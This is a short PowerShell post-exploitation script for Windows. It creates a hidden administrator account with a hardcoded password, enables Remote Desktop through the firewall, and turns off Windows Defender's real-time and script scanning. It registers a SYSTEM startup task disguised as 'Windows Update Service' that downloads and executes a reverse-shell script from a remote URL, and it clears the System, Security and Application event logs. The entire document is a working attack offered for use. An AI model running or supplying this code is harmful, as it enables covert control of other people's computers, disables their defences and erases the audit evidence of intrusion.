# 1. Create a Hidden Admin User
$Username = "hidAdmin"
$Password = ConvertTo-SecureString "Pass@1234" -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -FullName "System Admin" -Description "Windows Service"
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Hide user from login screen
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v $Username /t REG_DWORD /d 0 /f

# 2. Enable Remote Desktop for Future Access
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes

# 3. Disable Windows Defender (Basic AV Evasion)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true

# 4. Add Reverse Shell to Startup (Persistence)
$TaskName = "Windows Update Service"
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -C iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Tumelo0321/code25/refs/heads/main/reverse.ps1')"
$TaskTrigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -TaskName $TaskName -Description "Microsoft Windows Update Service" -User "SYSTEM" -RunLevel Highest -Force

# 5. Clear Logs to Remove Traces
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Done!
Write-Output "[+] Persistence & Escalation Complete."
